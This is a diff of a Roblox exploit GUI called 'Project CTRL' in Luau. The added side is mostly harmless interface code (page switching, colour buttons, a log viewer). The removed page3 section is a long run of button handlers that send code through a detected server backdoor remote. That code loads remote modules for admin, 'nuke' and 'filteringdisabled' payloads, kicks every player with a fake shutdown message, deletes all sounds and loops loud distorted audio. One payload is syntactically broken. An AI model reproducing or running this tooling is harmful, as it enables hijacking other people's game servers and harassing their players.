+	LogService.MessageOut:Connect(function(message, messageType)
+		if message == "Hello world!" then return end -- ⛔ Skip exact match
+		
+		local timestamp = getTimeStamp()
+		local color = Color3.fromRGB(255, 255, 255)
+		
+		if messageType == Enum.MessageType.MessageWarning then
+			color = Color3.fromRGB(255, 217, 0)
+		elseif messageType == Enum.MessageType.MessageError then
+			color = Color3.fromRGB(179, 0, 0)
+		end
+		
+		local fullText = "[" .. timestamp .. "] " .. message
+		addLogLine(fullText, color)
+	end)
+end;
+task.spawn(C_81);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_84()
+local script = G2L["84"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.page1.Visible = false
+		script.Parent.Parent.page2.Visible = false
+		script.Parent.Parent.page3.Visible = false
+		script.Parent.Parent.page4.Visible = true
+		script.Parent.Parent.page5.Visible = false
+	end)
+end;
+task.spawn(C_84);
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+local function C_8e()
+local script = G2L["8e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
+	end)
+end;
+task.spawn(C_8e);
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+local function C_92()
+local script = G2L["92"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+	end)
+end;
+task.spawn(C_92);
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+local function C_96()
+local script = G2L["96"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+	end)
+end;
+task.spawn(C_96);
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+local function C_9a()
+local script = G2L["9a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
+	end)
+end;
+task.spawn(C_9a);
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+local function C_9e()
+local script = G2L["9e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	end)
+end;
+task.spawn(C_9e);
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+local function C_a2()
+local script = G2L["a2"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+	end)
+end;
+task.spawn(C_a2);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_a6()
+local script = G2L["a6"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.page1.Visible = false
+		script.Parent.Parent.page2.Visible = false
+		script.Parent.Parent.page3.Visible = false
+		script.Parent.Parent.page4.Visible = false
+		script.Parent.Parent.page5.Visible = true
+	end)
+end;
+task.spawn(C_a6);
 -- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
-local function C_1e()
-local script = G2L["1e"];
+local function C_ab()
+local script = G2L["ab"];
 	local scrollingFrame = script.Parent
 	local lastY = scrollingFrame.CanvasSize.Y.Offset
 	
@@ -1776,10 +2844,10 @@ local script = G2L["1e"];
 		end
 	end)
 end;
-task.spawn(C_1e);
+task.spawn(C_ab);
 -- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
-local function C_24()
-local script = G2L["24"];
+local function C_b1()
+local script = G2L["b1"];
 	local textBox = script.Parent
 	local parent = textBox.Parent
 	local textLabel = parent:FindFirstChild("TextLabel")
@@ -1801,10 +2869,10 @@ local script = G2L["24"];
 	
 	updateLineNumbers()
 end;
-task.spawn(C_24);
+task.spawn(C_b1);
 -- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
-local function C_25()
-local script = G2L["25"];
+local function C_b2()
+local script = G2L["b2"];
 	local textBox = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local runService = game:GetService("RunService")
@@ -1981,1385 +3049,12 @@ local script = G2L["25"];
 	
 	textBox:GetPropertyChangedSignal("Text"):Connect(updateTooltip)
 end;
-task.spawn(C_25);
+task.spawn(C_b2);
 -- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
-local function C_26()
-local script = G2L["26"];
+local function C_b3()
+local script = G2L["b3"];
 	script.Parent.Text = 'print("project transparent SS")'
 end;
-task.spawn(C_26);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_3f()
-local script = G2L["3f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(14125553864):Fire("' .. username .. '","c00lkidd")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_3f);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_43()
-local script = G2L["43"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = ' require(14572394952)("' .. username .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_43);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_47()
-local script = G2L["47"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_47);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_4b()
-local script = G2L["4b"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(15267263357).V11("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_4b);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_4f()
-local script = G2L["4f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(78790302691160):Hload("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_4f);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_53()
-local script = G2L["53"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(12350030542).RC7("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_53);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_57()
-local script = G2L["57"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(17776365113).kj("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_57);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_5b()
-local script = G2L["5b"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(135686792632620).nuke("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_5b);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_5f()
-local script = G2L["5f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = [[local SoundService = game:GetService("SoundService")
-		
-	-- Sound IDs
-		local soundIds = {
-			82706813987936,
-			76279547029713,
-			135763933956435
-		}
-		
-	-- Create and configure sounds
-		local sounds = {}
-		
-	for _, id in ipairs(soundIds) do
-		local sound = Instance.new("Sound")
-		sound.SoundId = "rbxassetid://" .. id
-		sound.Volume = 10
-		sound.PlaybackSpeed = 0.2
-			
-	-- Add distortion effect (level 0.9)
-		local distortion = Instance.new("DistortionSoundEffect")
-		distortion.Level = 0.5
-		distortion.Parent = sound
-			
-		sound.Parent = SoundService
-		table.insert(sounds, sound)
-	end
-		
-	-- Function to play sounds in sequence
-		local function playSequence()
-			while true do
-				for _, sound in ipairs(sounds) do
-					sound:Play()
-					sound.Ended:Wait()
-				end
-			end
-		end
-		
-	-- Start the loop
-	playSequence()
-	]]
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_5f);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_63()
-local script = G2L["63"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(7634392335)("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_63);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_67()
-local script = G2L["67"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(75026282232818).load("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_67);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_6b()
-local script = G2L["6b"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(70681531110549).admin("' .. game.Players.LocalPlayer.Name .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_6b);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_6f()
-local script = G2L["6f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(10304477576).AntiSkid()'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_6f);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_73()
-local script = G2L["73"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = [[for _, obj in ipairs(game:GetDescendants()) do
-		if obj:IsA("Sound") then
-		obj:Destroy()
-		end
-		end
-		]]
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_73);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_77()
-local script = G2L["77"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = [[for i,v player in ipairs(game.Players:GetDescendants()) do
-		v:Kick("This server has been shut down")
-		end
-		]]
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_77);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_7b()
-local script = G2L["7b"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(9978015219).filteringdisabled("' .. username .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_7b);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_7f()
-local script = G2L["7f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = ' require(14499140823)("' .. username .. '", "sorcerer")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_7f);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_83()
-local script = G2L["83"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(2823974237).giveGuns' .. username .. ''
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_83);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_87()
-local script = G2L["87"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(104732504345735).jumpscare("' .. username .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_87);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_8b()
-local script = G2L["8b"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(104712588684071)("' .. username .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_8b);
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_8f()
-local script = G2L["8f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		local backdoor = getgenv().confirmedBackdoor
-		local backdoorType = getgenv().confirmedType
-		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
-		end
-		
-		local rawcode = 'require(6036737823).CrackedByIncreaseron("' .. username .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
-	end)
-end;
-task.spawn(C_8f);
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_93()
-local script = G2L["93"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = true
-		script.Parent.Parent.page2.Visible = false
-		script.Parent.Parent.page3.Visible = false
-		script.Parent.Parent.page4.Visible = false
-		script.Parent.Parent.page5.Visible = false
-	end)
-end;
-task.spawn(C_93);
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_96()
-local script = G2L["96"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = false
-		script.Parent.Parent.page2.Visible = true
-		script.Parent.Parent.page3.Visible = false
-		script.Parent.Parent.page4.Visible = false
-		script.Parent.Parent.page5.Visible = false
-	end)
-end;
-task.spawn(C_96);
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_99()
-local script = G2L["99"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = false
-		script.Parent.Parent.page2.Visible = false
-		script.Parent.Parent.page3.Visible = true
-		script.Parent.Parent.page4.Visible = false
-		script.Parent.Parent.page5.Visible = false
-	end)
-end;
-task.spawn(C_99);
--- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
-local function C_9d()
-local script = G2L["9d"];
-	local scrollingFrame = script.Parent
-	local LogService = game:GetService("LogService")
-	
-	-- Format time
-	local function getTimeStamp()
-		local t = os.date("*t")
-		return string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
-	end
-	
-	-- Create a new label for each log line
-	local function addLogLine(text, color)
-		local label = Instance.new("TextLabel")
-		label.Name = "LOG"
-		label.Text = text
-		label.TextColor3 = color
-		label.BackgroundTransparency = 1
-		label.Font = Enum.Font.Code
-		label.TextSize = 14
-		label.TextWrapped = true
-		label.Size = UDim2.new(1, -10, 0, 0)
-		label.AutomaticSize = Enum.AutomaticSize.Y
-		label.Parent = scrollingFrame
-		
-		-- Apply default UIStroke
-		local stroke = Instance.new("UIStroke")
-		stroke.Parent = label
-	end
-	
-	-- Listen to all console output
-	LogService.MessageOut:Connect(function(message, messageType)
-		if message == "Hello world!" then return end -- ⛔ Skip exact match
-		
-		local timestamp = getTimeStamp()
-		local color = Color3.fromRGB(255, 255, 255)
-		
-		if messageType == Enum.MessageType.MessageWarning then
-			color = Color3.fromRGB(255, 217, 0)
-		elseif messageType == Enum.MessageType.MessageError then
-			color = Color3.fromRGB(179, 0, 0)
-		end
-		
-		local fullText = "[" .. timestamp .. "] " .. message
-		addLogLine(fullText, color)
-	end)
-end;
-task.spawn(C_9d);
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_a0()
-local script = G2L["a0"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = false
-		script.Parent.Parent.page2.Visible = false
